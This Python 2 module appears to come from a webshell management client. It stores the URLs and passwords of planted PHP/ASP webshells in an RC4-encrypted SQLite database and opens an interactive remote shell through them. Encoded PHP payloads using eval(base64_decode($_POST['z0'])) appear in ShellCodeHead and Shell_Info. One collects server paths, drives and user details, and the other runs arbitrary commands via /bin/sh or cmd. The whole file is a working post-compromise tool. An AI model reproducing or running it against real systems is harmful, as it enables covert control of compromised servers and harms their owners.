#encoding:utf-8
from Mod.Core import *
import sqlite3
import os
import urllib
import base64

DbConn = None
DbCur  = None
Pwd = "."
Password = ""
Prompt = "$"
System = "Linux"
Shell_Bin = "/bin/sh"
Shell_Url = ""
Shell_Type = ""
Shell_Pass = ""
Shell_Method = ""
MainCommandList = None

ShellCodeHead = "%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D"
def DelCache():
    try:
        os.remove("./Data/shells_d.db")
    except Exception,e:
        pass
def PromptInit():
    if System == "Windows":
        Core.Controller.Prompt = Pwd + ">"
    else:
        Core.Controller.Prompt = Pwd + "$"

def DbCommit():
    global DbConn
    DbConn.commit()
    Core.Rc4.Rc4File("./Data/shells_d.db", "./Data/shells.db", Password)

def AddGroup(name):
	DbCur.execute("insert into SGroup values('%s');" % name)
	DbCommit()
	print "Shells group successfully added."

def AddShell():
	group = raw_input("Group(default):")
	if group == '': group = "default"
	DbCur.execute("select * from SGroup where name='%s';" % group)
	if DbCur.fetchone() == None:
		print "Error! group not found."
		return
	name = raw_input("Name:")
	if name == '':
		print "Error! Can not be empty."
		return

	DbCur.execute("select * from Shell where name='%s';" % name)
	if DbCur.fetchone() != None:
		print "Error! Name already exists."
		return

	url = raw_input("Url:")
	if url == '':
		print "Error! Can not be empty."
		return

	method = raw_input("Method(POST/GET):")
	method = method.upper()
	if method != "GET" and method != "POST":
		print "Error! Method"
		return
	
	stype = raw_input("Type(PHP/ASP):")
	stype = stype.upper()
	if stype != "PHP" and stype != "ASP":
		print "Error! Type"
		return
	password = raw_input("Password:")
	if password == '':
		print "Error! Can not be empty."
		return
	

	DbCur.execute("insert into Shell values(NULL,'%s','%s','%s','%s','%s', '%s');" % (name, group, url, method, stype, password))
	DbCommit()
	print "Shell successfully added."

def DelGroup(name):
	DbCur.execute("delete from SGroup where name='%s';" % name)
	DbCommit()
	print "Shells group successfully deleted."

def ShowGroups():
	for c in DbCur.execute("select * from SGroup;"):
		print c[0]


def ShowShells():
	for c in DbCur.execute("select * from Shell;"):
		print "ID:%s Name:%s  Group:%s  Url:%s  Method:%s  Type:%s" % (c[0],c[1],c[2],c[3],c[4],c[5])


def Shell_Info():
    global Pwd
    global System
    System = ""
    shellcode = "%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D"
    sendData = Shell_Pass + "=" + shellcode
    if Shell_Method == "GET":
        url = url + "?" + sendData
    
    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    retContent = httpClient.GetString()
    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    if retContent == "":
        print retContent
        return

    retInfo = retContent.split("\t")
    Pwd = retInfo[0]
    driveInfo = retInfo[1]
    SystemInfo = retInfo[2]
    print "DriveInfo:%s\r\nSystemInfo:%s" % (driveInfo,SystemInfo)
    if SystemInfo.find("Windows") >= 0:
        global Shell_Bin
        global Prompt
        System = "Windows"
        Prompt = ">"
        Pwd = Pwd.replace("/","\\")


def Shell_Cmd(cmd):
	global Pwd
        z1 = urllib.quote(base64.b64encode("/bin/sh"))
        z2 = urllib.quote(base64.b64encode('cd "%s";%s;echo [S];pwd;echo [E]' % (Pwd, cmd)))
        if System == "Windows":
            z1 = urllib.quote(base64.b64encode("cmd"))
            z2 = urllib.quote(base64.b64encode('cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)))

        #z1 = urllib.quote(base64.b64encode("cmd"))
        #z2 = urllib.quote(base64.b64decode('cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)))

	shellcode = ShellCodeHead + "&z1=" + z1 + "&z2=" + z2
	sendData = Shell_Pass + "=" + shellcode
	#print sendData
	if Shell_Method == "GET":
		url = url + "?" + sendData

	httpClient = Core.Http.HttpClient(Shell_Url)
	httpClient.Method = Shell_Method
	httpClient.PostData = sendData
        try:
	    retContent =  httpClient.GetString()
        except Exception,e:
            print "Timed out!"
            return

        retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
        #print retContent + "\r\n\r\n"
        echo = ""
        if retContent.find("[S]") > 0:
            echo = retContent[:retContent.find("[S]")-1]
	Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
        Pwd = Pwd.replace("\r","")
        Pwd = Pwd.replace("\n","")

        PromptInit()
	return echo

def Shell_Cmd_Exit():
    Core.Command.CommandList = MainCommandList
    Core.Controller.Prompt = ">"

def OtherCommand(command):
    global Pwd
    cmds = command.split(" ")
    if System == "Windows":
        sep = "\\"
    else:
        sep = "/"


    if len(cmds) == 2:
        if cmds[0] == "cd":
            if cmds[1] == "..":
                print Pwd
                if Pwd[len(Pwd)-1:] != ":":
                        pwd = ""
                        pwd = Pwd[:len(Pwd)-1]

                Pwd = Pwd[:pwd.rfind(sep)] + sep
                PromptInit()
                return
            
            if cmds[1] != "":
                if System == "Windows":
                    if cmds[1].find(":") > 0:
                        Pwd = cmds[1]
                        PromptInit()
                        return
                else:
                    if cmds[1][len(cmds[1])-1:] == "/":
                        Pwd = cmds[1]
                        PromptInit()
                        return
                             

    if command != "":
        print Shell_Cmd(command)
    

def UseShell(argv):
	DbCur.execute("select * from Shell where id='%s'" % argv)
	r = DbCur.fetchone()
	if r == None:
		DbCur.execute("select * from Shell where name='%s'" % argv)
		r = DbCur.fetchone()
	
	if r != None:
            global Shell_Url
            global Shell_Method
            global Shell_Type
            global Shell_Pass
	    Shell_Url = r[3]
	    Shell_Method = r[4]
    	    Shell_Type = r[5]
	    Shell_Pass = r[6]
            global System
            System = ""
            Shell_Info()
                
            global MainCommandList
            MainCommandList = Core.Command.CommandList
            Core.Command.CommandList = []
            Core.Command.CommandAdd("exit", Shell_Cmd_Exit, "Exit this shell")
            Core.Command.CommandAdd("help", Core.Command.CommandShow, "Show the command list")
            Core.Command.CommandAdd("other", OtherCommand, "Remote Command")

            if System == "Windows":
                Core.Controller.Prompt = Pwd + ">"
            else:
                Core.Controller.Prompt = Pwd + "$"

def DataInit():
	global DbConn
	global DbCur
        global Password
        import getpass
        DelCache()

        if os.path.exists("./Data/shells.db"):
            Password = getpass.getpass()
            Core.Rc4.Rc4File("./Data/shells.db", "./Data/shells_d.db", Password)
            DbConn = sqlite3.connect("./Data/shells_d.db")
            DbCur = DbConn.cursor()
            try:
                DbCur.execute("select * from SGroup;")
            except Exception, e:
                print "Password error!"
                Core.Controller.Exit()

        else:
            DbConn = sqlite3.connect("./Data/shells_d.db")
            DbCur = DbConn.cursor()
            #Database init
            DbCur.execute("create table SGroup(name text);")
	    DbCur.execute("create table Shell(id INTEGER PRIMARY KEY, name text UNIQUE, sgroup text, url text, method varchar(5), stype varchar(5), pass text);")
	    DbCur.execute("insert into SGroup values('default');")

            while True:
                Password = getpass.getpass()
                if Password != None:
                    break
            DbCommit()

def Init():
	DataInit()
	Core.Command.CommandAdd("add group",AddGroup, "Add shell group.\r\n   Use:add group [name]")
	Core.Command.CommandAdd("add shell", AddShell, "Add shell")
	Core.Command.CommandAdd("show groups", ShowGroups, "Show the shell groups")
	Core.Command.CommandAdd("show shells", ShowShells, "Show the shells list")
	Core.Command.CommandAdd("del group", DelGroup, "Delete the group")
	Core.Command.CommandAdd("use shell", UseShell, "Use the shell\r\n   Use:use shell [id|name]")
        Core.Controller.ExitFuns.append(DelCache)	
